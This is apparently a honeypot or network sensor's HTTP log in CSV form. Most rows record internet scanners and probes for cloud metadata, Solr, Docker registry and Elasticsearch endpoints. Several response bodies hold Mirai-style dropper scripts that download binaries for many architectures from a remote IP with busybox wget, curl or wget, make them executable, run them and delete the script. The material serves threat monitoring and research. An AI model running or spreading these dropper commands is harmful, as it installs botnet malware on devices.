ts,uid,orig_h,orig_p,resp_h,resp_p,method,host,uri,referrer,user_agent,status_code,request_body,response_body,trans_depth,version,request_body_len,response_body_len
1767972277.168788,CHhMAXtvnCwsU1vek,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
1767972277.924401,CUBV6h1FfYw54Z4vS6,,,,,GET,169.254.169.254,/2016-09-02/dynamic/instance-identity/document,,node-fetch/1.0 (+https://github.com/bitinn/node-fetch),,,,1,,0,0
1767972287.905563,CD3l0c1tny5HzgwIXf,,,,,GET,169.254.169.254,/metadata/instance?api-version=2017-04-02,,node-fetch/1.0 (+https://github.com/bitinn/node-fetch),,,,1,,0,0
1767972297.968755,Cu0dtY3qeCgqqDlXR9,,,,,GET,169.254.169.254,/computeMetadata/v1/instance/id,,node-fetch/1.0 (+https://github.com/bitinn/node-fetch),,,,1,,0,0
1767972297.968755,C963tT3devozCyzl62,,,,,GET,169.254.169.254,/computeMetadata/v1/instance/machine-type,,node-fetch/1.0 (+https://github.com/bitinn/node-fetch),,,,1,,0,0
1767972297.968755,Cg4j2G1atAuV2S3uAd,,,,,GET,169.254.169.254,/computeMetadata/v1/instance/zone,,node-fetch/1.0 (+https://github.com/bitinn/node-fetch),,,,1,,0,0
1767972577.453602,CFQn5TA4JsbA7dAni,,,,,GET,211.115.206.12,/,,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/54.0.3078.88 Safari/537.32",,,,1,,0,0
1767972578.874976,Cu87hql0ZQrDvsmN6,,,,,GET,localhost,/,,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/54.0.3078.88 Safari/537.32",,,,1,,0,0
1767972584.708657,CF0uEe17cqqpPzwJnl,,,,,GET,211.115.206.12,/,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,,1,,0,0
1767972651.244056,CWGNlj2gy3mnvkHoz2,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767972676.939294,CibRLq4y0dnMXfgxZ9,,,,,GET,211.115.206.12,/,,curl/7.64.1,,,,1,,0,0
1767972706.008233,CNLXpgX4fNIV8eqw2,,,,,GET,211.115.206.12,/,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",,,,1,,0,0
1767972706.328821,CEfE5c2s1FDcegYSI1,,,,,GET,211.115.206.12,/,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",,,,1,,0,0
1767972717.800644,C46xj62As5SNVt3rZ,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
1767972733.321593,CRXafO31hIJSxTH2Ib,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767972786.699802,CFYHt12z61QB3nT4Ub,,,,,GET,ossweb-img.qq.com,http://ossweb-img.qq.com/images/js/eas/eas.js,,Mozilla,,,,1,,0,0
1767972811.546446,Cwj6A23Y4KcuChahXf,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
1767972870.709777,CBzkaZ1qvvwypRm16e,,,,,GET,211.115.206.12,/,,curl/7.64.1,,,,1,,0,0
1767972873.562303,Cy6uZF2aATvCeFLTh2,,,,,GET,211.115.206.12,/,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0,,,,1,,0,0
1767972878.363517,CHgCU01SyvD6LoBSf4,,,,,GET,,/,,,,,,1,,0,0
1767972879.813584,CPbP5gQCOfLWdjzSc,,,,,OPTIONS,,/,,,,,,1,,0,0
1767972881.270175,CJeKDPPeCHGrshyNf,,,,,OPTIONS,,/ RTSP/1.,,,,,,1,,0,0
1767972894.536897,C08xC54029npMrRwag,,,,,OPTIONS,,sip:nm SIP/2.,,,,,,1,,0,0
1767972896.122348,Cm9glJnEUA6dNUN25,,,,,GET,211.115.206.12,/solr/admin/info/system,,Go-http-client/1.1,,,,1,,0,0
1767972896.137941,Cel185oOrZYQjZtU6,,,,,GET,211.115.206.12,/v2/_catalog,,Go-http-client/1.1,,,,1,,0,0
1767972896.138461,ClbPxC3ORvBlwTkr9l,,,,,GET,211.115.206.12,/,,Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/),,,,1,,0,0
1767972896.144523,CjET3F4txZVK9Xsctd,,,,,GET,211.115.206.12,/query?q=SHOW+DIAGNOSTICS,,Go-http-client/1.1,,,,1,,0,0
1767972896.177192,CrrYsiWQh0aK0wW64,,,,,GET,211.115.206.12,/cgi-bin/authLogin.cgi,,Go-http-client/1.1,,,,1,,0,0
1767972897.655912,C3PVVzepLl8rNqOMh,,,,,GET,211.115.206.12,/solr/admin/info/system,,Go-http-client/1.1,,,,1,,0,0
1767972897.659167,CO1mvguonuBBQREFe,,,,,GET,211.115.206.12,/v2/_catalog,,Go-http-client/1.1,,,,1,,0,0
1767972897.666096,CqIBl33Cv19mS9AgTk,,,,,GET,211.115.206.12,/query?q=SHOW+DIAGNOSTICS,,Go-http-client/1.1,,,,1,,0,0
1767972897.671002,CN19gm3OOU1cQeKySi,,,,,GET,211.115.206.12,/cgi-bin/authLogin.cgi,,Go-http-client/1.1,,,,1,,0,0
1767972899.10991,ChTIks4MlE1meaGUFg,,,,,GET,211.115.206.12,/solr/admin/info/system,,Go-http-client/1.1,,,,1,,0,0
1767972899.123529,CvkMoyhPwZ60u0ZJb,,,,,GET,211.115.206.12,/v2/_catalog,,Go-http-client/1.1,,,,1,,0,0
1767972899.129974,C8p0iAsrhBhbo8t8a,,,,,GET,211.115.206.12,/query?q=SHOW+DIAGNOSTICS,,Go-http-client/1.1,,,,1,,0,0
1767972899.145386,CDTqYN2i7CgtNzVaFi,,,,,GET,211.115.206.12,/cgi-bin/authLogin.cgi,,Go-http-client/1.1,,,,1,,0,0
1767972900.615887,C0D2Rc4YlcgTGYtC1b,,,,,GET,211.115.206.12,/solr/admin/cores?action=STATUS&wt=json,,Go-http-client/1.1,,,,1,,0,0
1767972902.091136,CwoJViLfoM9FPO58i,,,,,GET,211.115.206.12,/solr/admin/cores?action=STATUS&wt=json,,Go-http-client/1.1,,,,1,,0,0
1767972903.55658,CkNusO2LkgbJMOuWa7,,,,,GET,211.115.206.12,/solr/admin/cores?action=STATUS&wt=json,,Go-http-client/1.1,,,,1,,0,0
1767972969.58591,Cc9pt22bQZNbAnC5df,,,,,GET,211.115.206.12,/,,Mozilla/5.0 zgrab/0.x,,,,1,,0,0
1767972977.857682,CuOml51ouDr4vD6ro8,,,,,OPTIONS,,/ RTSP/1.,,,,,,1,,0,0
1767973000.960969,Cmrurz4stDkJwQhtqa,,,,,GET,211.115.206.12,/,,,,,,1,,0,0
1767972713.235744,CkJJlv1d5z73m9Ua8i,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
1767973025.246857,CQ1U7h4ELix5X2pfG8,,,,,GET,211.115.206.12,/server-status,,Go-http-client/1.1,200.0,,"{""error"":{""root_cause"":[{""type"":""index_not_found_exception"",""reason"":""no such index [server-status]"",""resource.type"":""index_or_alias"",""resource.id"":""server-status"",""index_uuid"":""_na_"",""index"":""server-status""}],""type"":""index_not_found_exception"",""reason"":""no such index [server-status]"",""resource.type"":""index_or_alias"",""resource.id"":""server-status"",""index_uuid"":""_na_"",""index"":""server-status""},""status"":404}",1,1.1,0,407
1767973025.27163,CjwJTam1RdjAmRbG9,,,,,GET,211.115.206.12,/,,Go-http-client/1.1,200.0,,"{
  ""status"" : 200,
  ""name"" : ""USNYES01"",
  ""cluster_name"" : ""elasticsearch"",
  ""version"" : {
    ""number"" : ""1.4.1"",
    ""build_hash"" : ""b88f43fc40b0bcd7f173a1f9ee2e97816de80b19"",
    ""build_timestamp"" : ""2015-07-29T09:54:16Z"",
    ""build_snapshot"" : false,
    ""lucene_version"" : ""4.10.4""
  },
  ""tagline"" : ""You Know, for Search""
}",1,1.1,0,335
1767973025.926397,CABTUY3q1rtGzLuE64,,,,,GET,211.115.206.12,/_cat/indices?format=json,,Go-http-client/1.1,200.0,,"[{""health"":""yellow"",""status"":""open"",""index"":""1cf0aa9d61f185b59f643939f862c01f89b21360"",""uuid"":""d_g1c8IASCGdhuFwcEh5WA"",""pri"":""1"",""rep"":""1"",""docs.count"":""30"",""docs.deleted"":""0"",""store.size"":""13416"",""pri.store.size"":""13416""},{""health"":""yellow"",""status"":""open"",""index"":""db18744ea5570fa9bf868df44fecd4b58332ff24"",""uuid"":""_W3iCnnaQKyKnJsF7HD7Eg"",""pri"":""1"",""rep"":""1"",""docs.count"":""6"",""docs.deleted"":""0"",""store.size"":""4136"",""pri.store.size"":""4136""}]",1,1.1,0,442
1767973026.599852,CzkNVq4mGePeKNEEA3,,,,,GET,211.115.206.12,/_stats/store/?pretty&human&level=cluster,,Go-http-client/1.1,200.0,,"{""_all"":{""primaries"":{""completion"":{""size_in_bytes"":0},""docs"":{""count"":36,""deleted"":0},""fielddata"":{""evictions"":0,""memory_size_in_bytes"":0},""flush"":{""periodic"":0,""total"":3,""total_time_in_millis"":91},""get"":{""current"":0,""exists_time_in_millis"":0,""exists_total"":0,""missing_time_in_millis"":0,""missing_total"":0,""time_in_millis"":0,""total"":0},""indexing"":{""delete_current"":0,""delete_time_in_millis"":0,""delete_total"":0,""index_current"":0,""index_failed"":0,""index_time_in_millis"":546,""index_total"":36,""is_throttled"":false,""noop_update_total"":0,""throttle_time_in_millis"":0},""merges"":{""current"":0,""current_docs"":0,""current_size_in_bytes"":0,""total"":0,""total_auto_throttle_in_bytes"":62914560,""total_docs"":0,""total_size_in_bytes"":0,""total_stopped_time_in_millis"":0,""total_throttled_time_in_millis"":0,""total_time_in_millis"":0},""query_cache"":{""cache_count"":0,""cache_size"":0,""evictions"":0,""hit_count"":0,""memory_size_in_bytes"":0,""miss_count"":0,""total_count"":0},""recovery"":{""current_as_source"":0,""current_as_target"":0,""throttle_time_in_millis"":0}",1,1.1,0,12876
1767973027.26149,CGluZM1npMg8b0sXKf,,,,,GET,211.115.206.12,/_cat/nodes?format=json,,Go-http-client/1.1,200.0,,"[{""cpu"":""100"",""heap.percent"":""10"",""load_15m"":""1.53"",""load_1m"":""1.43"",""load_5m"":""1.56"",""master"":""*"",""name"":""79cc84ce5091"",""node.role"":""dim"",""ram.percent"":""96"",""ip"":""211.115.206.12""}]",1,1.1,0,181
1767973032.281372,CxeXoF2C5cMXAUdCqh,,,,,GET,158.94.208.27,/w.sh,,curl/7.73.0,200.0,,"busybox wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
busybox wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
busybox wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
busybox wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
busybox wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
busybox wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
busybox wget http://158.94.208.27/bins/pmpsl; chmod 777 pmpsl; ./pmpsl android
busybox wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
busybox wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
busybox wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
busybox wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
busybox wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",1,1.1,0,958
1767973032.972511,CxeXoF2C5cMXAUdCqh,,,,,GET,158.94.208.27,/c.sh,,curl/7.73.0,200.0,,"curl http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
curl http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
curl http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
curl http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
curl http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
curl http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
curl http://158.94.208.27/bins/pmpsl; chmod 777 pmpsl; ./pmpsl android
curl http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
curl http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
curl http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
curl http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
curl http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",2,1.1,0,862
1767973033.260116,CxeXoF2C5cMXAUdCqh,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",3,1.1,0,848
1767973033.544359,CxeXoF2C5cMXAUdCqh,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",4,1.1,0,848
1767973033.827555,CxeXoF2C5cMXAUdCqh,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",5,1.1,0,848
1767973034.117351,CxeXoF2C5cMXAUdCqh,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",6,1.1,0,848
1767973035.146538,CsTiIXqprl2lcz6b4,,,,,GET,211.115.206.12,/index.htm,,Mozilla/5.0,404.0,,"<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
",1,1.1,0,207
1767973035.164526,Ckoqjd4GRPsYjkyWP,,,,,GET,211.115.206.12,/,,,200.0,,"<!DOCTYPE html>
<!--[if IE 6]>
<html id=""ie6"" dir=""ltr"" lang=""en-US"">
<![endif]-->
<!--[if IE 7]>
<html id=""ie7"" dir=""ltr"" lang=""en-US"">
<![endif]-->
<!--[if IE 8]>
<html id=""ie8"" dir=""ltr"" lang=""en-US"">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html dir=""ltr"" lang=""en-US"">
<!--<![endif]-->

<head>
<meta charset=""UTF-8"" />
<meta name=""viewport"" content=""width=device-width"" />
<title>Wordpress | Here the subtitle</title>
<link rel=""profile"" href=""http://gmpg.org/xfn/11"" />
<link rel=""stylesheet"" type=""text/css"" media=""all"" href=""http://211.115.206.12:8080/static/wp-content/themes/twentyeleven/style.css"" />
<link rel=""pingback"" href=#"" />
<!--[if lt IE 9]>
<script src=""http://211.115.206.12:8080/static/wp-content/themes/twentyeleven/js/html5.js"" type=""text/javascript""></script>
<![endif]-->
<meta name='robots' content='noindex,nofollow' />
<link rel=""alternate"" type=""application/rss+xml"" title=""Wordpress &raquo; Feed"" href=""#"" />
<link rel=""alternate"" type=""application/rss+xml"" title=""Wordpress",1,1.1,0,6649
1767973158.553658,CfOXo618mDXV5LHL0d,,,,,GET,211.115.206.12,/,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",,,,1,,0,0
1767973164.266751,CSYnve3r1WMQh1TM0h,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767973180.36462,CpShiP2ZaP60cdW21e,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767973330.002944,CJy3FS2fVqyiy8DvJ7,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
1767973406.248919,CYXKm61MEiErMzgQn,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767973414.794634,C3Z3SD48YD81dpuscl,,,,,,,,,,400.0,,"Invalid method encountered:

  b'\x16\x03\x02\x01o\x01'
    ^",1,1.0,0,61
1767973409.156668,CaQ2w22feN3Lymsojh,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
1767973426.198786,CbQjzB1g6TNcuZYDyh,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767973526.494062,CJzQjKBELQDAcqoTb,,,,,GET,158.94.208.27,/w.sh,,curl/7.73.0,200.0,,"busybox wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
busybox wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
busybox wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
busybox wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
busybox wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
busybox wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
busybox wget http://158.94.208.27/bins/pmpsl; chmod 777 pmpsl; ./pmpsl android
busybox wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
busybox wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
busybox wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
busybox wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
busybox wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",1,1.1,0,958
1767973527.00664,CJzQjKBELQDAcqoTb,,,,,GET,158.94.208.27,/c.sh,,curl/7.73.0,200.0,,"curl http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
curl http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
curl http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
curl http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
curl http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
curl http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
curl http://158.94.208.27/bins/pmpsl; chmod 777 pmpsl; ./pmpsl android
curl http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
curl http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
curl http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
curl http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
curl http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",2,1.1,0,862
1767973527.269768,CJzQjKBELQDAcqoTb,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",3,1.1,0,848
1767973527.53683,CJzQjKBELQDAcqoTb,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",4,1.1,0,848
1767973527.817949,CJzQjKBELQDAcqoTb,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",5,1.1,0,848
1767973528.097182,CJzQjKBELQDAcqoTb,,,,,GET,158.94.208.27,/wget.sh,,curl/7.73.0,200.0,,"wget http://158.94.208.27/bins/parm; chmod 777 parm; ./parm android
wget http://158.94.208.27/bins/parm5; chmod 777 parm5; ./parm5 android
wget http://158.94.208.27/bins/parm6; chmod 777 parm6; ./parm6 android
wget http://158.94.208.27/bins/parm7; chmod 777 parm7; ./parm7 android
wget http://158.94.208.27/bins/pm68k; chmod 777 pm68k; ./pm68k android
wget http://158.94.208.27/bins/pmips; chmod 777 pmips; ./pmips android
wget http://158.94.208.27/bins/pmpsl; chmod 777 mpsl; ./pmpsl android
wget http://158.94.208.27/bins/pppc; chmod 777 pppc; ./pppc android
wget http://158.94.208.27/bins/psh4; chmod 777 psh4; ./psh4 android
wget http://158.94.208.27/bins/pspc; chmod 777 pspc; ./pspc android
wget http://158.94.208.27/bins/px86; chmod 777 px86; ./px86 android
wget http://158.94.208.27/bins/px86_64; chmod 777 px86_64; ./px86_64 android

rm $0",6,1.1,0,848
1767973532.010875,C3u77h2N9uLMjkNMY5,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767973636.715582,C8bHa84wZ5PsWwsep6,,,,,GET,211.115.206.12,/,,cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,,,1,,0,0
